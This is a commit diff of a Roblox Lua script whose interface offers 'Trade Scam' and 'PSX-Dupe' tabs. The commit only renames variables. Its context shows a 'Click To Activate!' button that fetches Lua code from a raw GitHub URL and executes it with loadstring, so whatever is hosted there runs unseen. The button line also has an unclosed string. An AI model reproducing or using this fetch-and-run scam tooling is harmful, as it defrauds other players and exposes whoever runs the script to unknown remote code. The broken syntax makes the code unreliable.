cec61cd5387ab33134e39e723b8435e4610c4c01
Maset0 <120063355+Maset0@users.noreply.github.com>
2022-12-08 13:31:14 +0200

    Update RobloxScript1.lua

--- RobloxScript1.lua
+++ RobloxScript1.lua
@@ -6,8 +6,8 @@ local Main = Window:NewTab("Trade Scam")
 local MainSection = Main:NewSection("Trade Scam")
 
 --Dupe
-local Main = Window:NewTab("Dupe")
-local MainSection = Main:NewSection("PSX-Dupe")
+local Dupe = Window:NewTab("Dupe")
+local DupeSection = Dupe:NewSection("PSX-Dupe")
 
 MainSection:NewButton("Click To Activate!", "Script BY 8888 Team!, function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/dsdsdsd/main/info.lua"))()
